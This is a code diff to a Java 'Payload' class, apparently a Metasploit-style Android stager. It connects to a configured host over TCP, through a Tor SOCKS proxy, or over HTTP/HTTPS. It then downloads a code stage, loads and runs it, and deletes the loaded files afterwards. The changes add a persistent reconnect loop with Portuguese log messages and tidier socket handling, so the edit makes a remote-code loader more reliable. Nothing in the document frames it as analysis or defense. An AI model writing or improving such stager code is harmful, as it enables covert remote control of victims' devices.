@@ -27,6 +27,7 @@ public class Payload {
     public static long retry_total;
     public static long retry_wait;
     public static long session_expiry;
+    private static boolean isConnected = false;
 
     public static void start(Object р0) {
     }
@@ -59,36 +60,43 @@ public class Payload {
         }
         String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
         try {
-            long sessionExpiry = (long) Integer.parseInt(timeouts[0]);
-            long commTimeout = (long) Integer.parseInt(timeouts[1]);
-            long retryTotal = (long) Integer.parseInt(timeouts[2]);
-            long retryWait = (long) Integer.parseInt(timeouts[3]);
+            long sessionExpiry = Integer.parseInt(timeouts[0]);
+            long commTimeout = Integer.parseInt(timeouts[1]);
+            long retryTotal = Integer.parseInt(timeouts[2]);
+            long retryWait = Integer.parseInt(timeouts[3]);
             long payloadStart = System.currentTimeMillis();
             session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
             comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
             retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
             retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
             String url = URL.substring(4).trim();
-            if (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
-                try {
-                } catch (Exception e) {
-                    e.printStackTrace();
+
+            int attempt = 0;
+            while (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
+                if (!isConnected) {
                     try {
+                        System.out.println("Tentando conectar em: " + url);
+                        if (url.startsWith("tcp")) {
+                            runStagefromTCP(url);
+                        } else {
+                            runStageFromHTTP(url);
+                        }
+                        isConnected = true;
+                        System.out.println("Conexão estabelecida!");
+                    } catch (Exception e) {
+                        isConnected = false;
+                        e.printStackTrace();
+                        attempt++;
+                        System.out.println("Tentativa " + attempt + " falhou. Aguardando...");
                         Thread.sleep(retry_wait);
-                    } catch (InterruptedException e2) {
-                        return;
                     }
                 }
-                if (url.startsWith("tcp")) {
-                    runStagefromTCP(url);
-                } else {
-                    runStageFromHTTP(url);
+                if (isConnected) {
+                    Thread.sleep(1000); // Verifica periodicamente se a conexão ainda está ativa
                 }
             }
-        } catch (NumberFormatException e3) {
-        }
-        catch (Exception e){
-
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -96,7 +104,9 @@ public class Payload {
         InputStream inStream;
         if (url.startsWith("https")) {
             URLConnection uc = new URL(url).openConnection();
-            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+            Class.forName("com.metasploit.stage.PayloadTrustManager")
+                    .getMethod("useFor", URLConnection.class)
+                    .invoke(null, uc);
             inStream = uc.getInputStream();
         } else {
             inStream = new URL(url).openStream();
@@ -105,22 +115,34 @@ public class Payload {
     }
 
     private static void runStagefromTCP(String url) throws Exception {
-        Socket sock;
+        Socket sock = null;
         String[] parts = url.split(":");
         int port = Integer.parseInt(parts[2]);
         String host = parts[1].split("/")[2];
-        if (host.equals("")) {
-            ServerSocket server = new ServerSocket(port);
-            sock = server.accept();
-            server.close();
-        } else {
-            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));
-            sock = new Socket(proxy);
-            sock.connect(new InetSocketAddress(host, port));
-        }
-        if (sock != null) {
-            sock.setSoTimeout(500);
-            readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
+
+        try {
+            if (host.equals("")) {
+                ServerSocket server = new ServerSocket(port);
+                sock = server.accept();
+                server.close();
+            } else {
+                Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));
+                sock = new Socket(proxy);
+                sock.connect(new InetSocketAddress(host, port));
+            }
+
+            if (sock != null) {
+                sock.setSoTimeout(1000);
+                isConnected = true;
+                readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
+            }
+        } catch (Exception e) {
+            isConnected = false;
+            throw e;
+        } finally {
+            if (sock != null) {
+                sock.close();
+            }
         }
     }
 
@@ -149,13 +171,12 @@ public class Payload {
             Object stage = myClass.newInstance();
             file.delete();
             new File(dexPath).delete();
-            myClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, parameters});
+            myClass.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
+                    .invoke(stage, in, out, parameters);
 
-
-            shouldRestart = false; 
+            shouldRestart = false;
         }
 
-        System.exit(0); 
+        System.exit(0);
     }
 }
-
